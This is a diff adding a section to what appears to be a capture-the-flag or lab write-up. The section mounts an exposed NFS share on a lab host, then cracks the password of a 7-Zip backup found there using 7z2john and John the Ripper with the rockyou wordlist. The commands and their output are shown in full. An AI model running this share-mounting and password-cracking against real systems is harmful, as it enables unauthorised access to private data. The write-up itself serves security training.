@@ -72,6 +72,32 @@ Export list for 192.168.56.110:
 now mount it on your system :
 
 ```bash
+root@kali: mount 192.168.56.110:/home/user/storage /mnt/tmp
+
+root@kali: ls /mnt/tmp
+backup.7z
+```
+
+when you want to unzip the file it asks for password and the only way to find it is to brute force the password
+
+use the tool `7z2john` for this :
+
+```bash
+root@kali: 7z2john backup.7z > ziphash.txt
+
+root@kali : john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
+Cost 1 (iteration count) is 524288 for all loaded hashes
+Cost 2 (padding size) is 0 for all loaded hashes
+Cost 3 (compression type) is 2 for all loaded hashes
+Cost 4 (data length) is 9488 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+chocolate        (backup.7z)     
+1g 0:00:00:01 DONE (2023-11-05 06:31) 0.9708g/s 31.06p/s 31.06c/s 31.06C/s 654321..butterfly
+Use the "--show" option to display all of the cracked passwords reliably
 ```
 
 
